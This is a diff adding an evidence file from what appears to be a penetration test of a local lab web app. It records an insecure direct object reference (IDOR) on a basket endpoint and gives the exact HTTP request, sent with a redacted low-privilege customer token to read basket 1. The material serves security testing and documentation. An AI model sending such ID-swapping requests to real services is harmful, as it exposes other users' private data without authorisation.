@@ -1,0 +1,8 @@
+# Evidence ID: EVD-V2-REQ
+# Finding: WEB-VUL-002 (Broken Access Control - IDOR on basket)
+# Date: 2026-10-03T19:37:32+05:30
+# Target: GET http://127.0.0.1:3000/rest/basket/1
+# Auth: Bearer token of low-privilege customer (id=25, role=customer)
+GET /rest/basket/1 HTTP/1.1
+Host: 127.0.0.1:3000
+Authorization: Bearer [REDACTED-JWT]
